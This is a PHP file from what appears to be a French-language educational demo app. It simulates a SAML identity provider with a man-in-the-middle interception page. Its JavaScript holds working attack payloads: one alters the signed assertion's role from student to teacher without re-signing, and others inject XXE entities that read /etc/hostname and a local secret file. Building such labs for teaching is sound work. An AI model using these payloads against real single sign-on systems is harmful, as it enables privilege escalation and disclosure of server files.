<?php
// idp.php - PAGE 2 : Fournisseur d'Identité Universitaire (IdP) Simulé
require_once __DIR__ . '/config.php';

$email = trim($_GET['email'] ?? 'etudiant@univ.com');
$intercept = !empty($_GET['intercept']);

$db = load_db();
$targetUser = null;
foreach ($db['users'] as $u) {
    if ($u['email'] === $email) {
        $targetUser = $u;
        break;
    }
}

if (!$targetUser) {
    $_SESSION['flash_message'] = "Utilisateur inconnu sur l'IdP.";
    $_SESSION['flash_type'] = "danger";
    header("Location: index.php");
    exit;
}

// 1. Génération de l'assertion SAML signée avec la clé privée de l'IdP
$samlXml = generate_saml_assertion($targetUser);
$samlBase64 = base64_encode($samlXml);

// 2. Si l'interception en direct est activée : Afficher le Studio d'Interception MitM
if ($intercept) {
    require_once __DIR__ . '/includes/header.php';
    ?>
    <div class="max-w-4xl mx-auto space-y-6">
        
        <!-- BANDEAU D'INTERCEPTION -->
        <div class="bg-indigo-900 text-white p-6 rounded-2xl shadow-lg border border-indigo-700">
            <div class="flex items-center justify-between flex-wrap gap-4">
                <div>
                    <span class="text-[11px] font-black uppercase tracking-widest bg-indigo-700 px-3 py-1 rounded-full text-indigo-200">
                        Simulation Man-in-the-Middle (MitM)
                    </span>
                    <h1 class="text-xl font-black mt-2">Intercepteur de Flux SAML 2.0 en Direct</h1>
                    <p class="text-indigo-200 text-xs mt-1">
                        L'IdP a émis l'assertion signée. Vous pouvez la modifier en direct sous les yeux du jury avant transmission.
                    </p>
                </div>
                <div class="text-3xl">🕵️‍♂️</div>
            </div>

            <!-- BOUTONS D'ATTAQUE RAPIDE EN 1 CLIC -->
            <div class="mt-6 pt-4 border-t border-indigo-800 flex flex-wrap gap-2 text-xs">
                <button type="button" onclick="injectRoleTeacher()" class="bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold px-3 py-1.5 rounded-lg shadow transition flex items-center gap-1.5">
                    <span>⚡</span> Attaque 1 : Remplacer <strong>student</strong> par <strong>teacher</strong>
                </button>
                <button type="button" onclick="injectXXE()" class="bg-rose-500 hover:bg-rose-400 text-white font-bold px-3 py-1.5 rounded-lg shadow transition flex items-center gap-1.5">
                    <span>💥</span> Attaque 2 : Injecter Entité XXE (secret.txt)
                </button>
                <button type="button" onclick="injectXXEHostname()" class="bg-rose-600 hover:bg-rose-500 text-white font-bold px-3 py-1.5 rounded-lg shadow transition flex items-center gap-1.5">
                    <span>💥</span> Attaque 2 : Injecter XXE (/etc/hostname)
                </button>
                <button type="button" onclick="restoreOriginal()" class="bg-indigo-700 hover:bg-indigo-600 text-white font-bold px-3 py-1.5 rounded-lg shadow transition flex items-center gap-1.5 ml-auto">
                    <span>🔄</span> XML Original
                </button>
            </div>
        </div>

        <!-- FORMULAIRE DE TRANSMISSION VERS LE SERVICE PROVIDER (DASHBOARD.PHP) -->
        <form id="samlForm" action="dashboard.php" method="POST" class="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm space-y-4">
            <div class="flex items-center justify-between">
                <label for="saml_xml" class="text-xs font-bold uppercase tracking-wider text-slate-700 flex items-center gap-2">
                    <span>📄</span> Contenu XML de l'Assertion SAML 2.0 (Modifiable au clavier) :
                </label>
                <span class="text-xs text-slate-400 font-mono">POST binding -> dashboard.php</span>
            </div>

            <textarea id="saml_xml" name="saml_xml" rows="16" class="w-full font-mono text-xs bg-slate-900 text-emerald-400 p-4 rounded-xl border border-slate-700 focus:outline-none focus:ring-2 focus:ring-blue-500 shadow-inner leading-relaxed"><?= htmlspecialchars($samlXml) ?></textarea>

            <!-- Champ caché avec encodage base64 pour simuler le transport SAML exact -->
            <input type="hidden" name="SAMLResponse" id="SAMLResponse" value="<?= $samlBase64 ?>">

            <div class="flex items-center justify-between pt-2">
                <a href="index.php" class="text-xs font-bold text-slate-500 hover:text-slate-800">
                    ← Annuler et retour
                </a>
                <button type="submit" class="bg-blue-600 hover:bg-blue-500 text-white font-black text-sm px-8 py-3 rounded-xl shadow-lg transition transform hover:scale-[1.02] flex items-center gap-2">
                    <span>🚀</span> Transmettre l'Assertion au Service Provider (dashboard.php)
                </button>
            </div>
        </form>

    </div>

    <script>
        const originalXml = <?= json_encode($samlXml) ?>;

        function injectRoleTeacher() {
            let val = document.getElementById('saml_xml').value;
            if (val.includes('<saml:AttributeValue>student</saml:AttributeValue>')) {
                val = val.replace('<saml:AttributeValue>student</saml:AttributeValue>', '<saml:AttributeValue>teacher</saml:AttributeValue>');
                document.getElementById('saml_xml').value = val;
                alert("✅ Rôle modifié en direct : student -> teacher !\nLa signature n'a pas été recalculée.");
            } else {
                alert("Le rôle student n'a pas été trouvé (peut-être déjà modifié).");
            }
        }

        function injectXXE() {
            let secretPath = "<?= addslashes(DATA_DIR . '/secret.txt') ?>";
            let dtd = '<!DOCTYPE samlp:Response [\n  <!ENTITY xxe SYSTEM "file://' + secretPath + '">\n]>\n';
            let val = document.getElementById('saml_xml').value;
            
            // Retirer tout DOCTYPE existant
            val = val.replace(/<!DOCTYPE[\s\S]*?\]>/gi, '');
            // Insérer après la balise <?xml
            val = val.replace(/<\?xml.*?\?>\n?/i, function(match) {
                return match + '\n' + dtd;
            });
            // Remplacer le nom de l'étudiant par l'entité &xxe;
            val = val.replace(/<saml:AttributeValue>Mamadou Sow<\/saml:AttributeValue>/, '<saml:AttributeValue>&xxe;</saml:AttributeValue>');
            document.getElementById('saml_xml').value = val;
            alert("💥 Charge XXE injectée !\nL'entité &xxe; pointe vers :\n" + secretPath);
        }

        function injectXXEHostname() {
            let dtd = '<!DOCTYPE samlp:Response [\n  <!ENTITY xxe SYSTEM "file:///etc/hostname">\n]>\n';
            let val = document.getElementById('saml_xml').value;
            val = val.replace(/<!DOCTYPE[\s\S]*?\]>/gi, '');
            val = val.replace(/<\?xml.*?\?>\n?/i, function(match) {
                return match + '\n' + dtd;
            });
            val = val.replace(/<saml:AttributeValue>Mamadou Sow<\/saml:AttributeValue>/, '<saml:AttributeValue>&xxe;</saml:AttributeValue>');
            document.getElementById('saml_xml').value = val;
            alert("💥 Charge XXE injectée pointant vers /etc/hostname !");
        }

        function restoreOriginal() {
            document.getElementById('saml_xml').value = originalXml;
            alert("🔄 Assertion SAML restaurée à son état d'origine.");
        }

        // Met à jour SAMLResponse en base64 lors de la soumission
        document.getElementById('samlForm').addEventListener('submit', function() {
            let raw = document.getElementById('saml_xml').value;
            document.getElementById('SAMLResponse').value = btoa(unescape(encodeURIComponent(raw)));
        });
    </script>

    <?php
    require_once __DIR__ . '/includes/footer.php';
    exit;
}

// 3. Sans interception en direct : Transmission standard HTTP-POST Binding (Burp Suite friendly !)
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>SAML HTTP-POST Binding...</title>
</head>
<body onload="document.forms[0].submit()" style="font-family:sans-serif; text-align:center; padding:50px;">
    <h2>Redirection SSO SAML vers EduNotes en cours...</h2>
    <p>Transfert de l'assertion SAML 2.0 signée par l'IdP...</p>
    <form method="POST" action="dashboard.php">
        <input type="hidden" name="SAMLResponse" value="<?= $samlBase64 ?>">
        <input type="hidden" name="saml_xml" value="<?= htmlspecialchars($samlXml) ?>">
        <noscript>
            <button type="submit">Cliquer ici pour continuer</button>
        </noscript>
    </form>
</body>
</html>
